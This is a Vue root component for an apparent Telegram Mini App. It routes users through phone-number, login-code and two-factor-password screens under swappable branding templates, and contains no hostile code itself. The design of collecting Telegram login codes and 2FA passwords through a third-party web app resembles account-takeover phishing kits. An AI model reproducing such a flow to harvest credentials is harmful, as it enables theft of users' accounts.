<script setup>
import { onMounted } from "vue";
import { useRouter } from "vue-router";
import { useUserStore } from "./stores/userStore";
import { useTemplateStore } from "./stores/templateStore";
import AppLoader from "./components/AppLoader.vue";

const router = useRouter();
const userStore = useUserStore();
const templateStore = useTemplateStore();

function navigateByState(currentState) {
  switch (currentState) {
    case "unauthorized":
      router.replace("/unauthorized");
      break;
    case "need_phone":
    case "expired":
      router.replace("/start");
      break;
    case "enter_code":
      router.replace("/code");
      break;
    case "enter_twoFA":
      router.replace("/password");
      break;
    case "end":
      router.replace("/end");
      break;
    default:
      router.replace("/start");
  }
}

onMounted(async () => {
  const tg = window.Telegram?.WebApp;
  tg?.ready?.();
  tg?.expand?.();

  if (tg?.themeParams?.bg_color) {
    document.body.style.backgroundColor = tg.themeParams.bg_color;
  }

  try {
    const okUser = await userStore.init();
    if (!okUser) {
      router.replace("/unauthorized");
      return;
    }

    const okTpl = await templateStore.init(userStore);
    if (!okTpl) {
      router.replace("/unauthorized");
      return;
    }

    navigateByState(userStore.state);
  } catch (err) {
    console.error("[App init failed]", err);
    userStore.isLoading = false;
    router.replace("/unauthorized");
  }
});
</script>

<template>
  <div class="app-container" :style="templateStore.themeVars">
    <div
      v-if="templateStore.template.backgroundUrl"
      class="bg-blur"
      :style="{
        backgroundImage: `url(${templateStore.template.backgroundUrl})`,
        filter: `blur(${templateStore.template.backgroundBlur}px)`,
      }"
    />
    <AppLoader :visible="userStore.isLoading" />
    <main v-if="!userStore.isLoading" class="content">
      <router-view />
    </main>
  </div>
</template>

<style>
:root {
  --page-bg: var(--tg-theme-bg-color, #f4f6fb);
  --text-color: var(--tg-theme-text-color, #111827);
  --card-bg: var(--tg-theme-secondary-bg-color, #ffffff);
  --button-bg: var(--tg-theme-button-color, #2481cc);
  --button-text: var(--tg-theme-button-text-color, #ffffff);
}
* {
  box-sizing: border-box;
}
body {
  margin: 0;
  background: var(--page-bg);
  color: var(--text-color);
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}
.app-container {
  min-height: 100vh;
  position: relative;
  display: flex;
  flex-direction: column;
  justify-content: center;
}
.bg-blur {
  position: fixed;
  inset: 0;
  background-size: cover;
  background-position: center;
  z-index: 0;
}
.content {
  position: relative;
  z-index: 1;
  padding: 16px;
}
.card {
  max-width: 420px;
  margin: 0 auto;
  background: var(--card-bg);
  color: var(--text-color);
  padding: 24px 20px;
  border-radius: 16px;
  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
}
.card h2 {
  margin: 0 0 8px;
  font-size: 20px;
}
.card p {
  margin: 0 0 16px;
  font-size: 14px;
  opacity: 0.85;
  line-height: 1.5;
}
.input {
  width: 100%;
  padding: 12px 14px;
  margin-bottom: 12px;
  border: 1px solid rgba(128, 128, 128, 0.35);
  border-radius: 10px;
  font-size: 15px;
  background: transparent;
  color: inherit;
}
.btn {
  width: 100%;
  padding: 12px 16px;
  border: 0;
  border-radius: 10px;
  background: var(--button-bg);
  color: var(--button-text);
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
}
.btn:disabled {
  opacity: 0.6;
  cursor: not-allowed;
}
.btn-secondary {
  width: 100%;
  padding: 10px 14px;
  margin-top: 8px;
  border: 1px solid rgba(128, 128, 128, 0.35);
  border-radius: 10px;
  background: transparent;
  color: inherit;
  font-size: 14px;
  cursor: pointer;
}
.error {
  color: #dc2626;
  font-size: 13px;
  margin: 0 0 12px;
}
.info-badge {
  display: inline-block;
  padding: 4px 10px;
  border-radius: 999px;
  font-size: 12px;
  background: rgba(36, 129, 204, 0.14);
  margin-bottom: 12px;
}
</style>
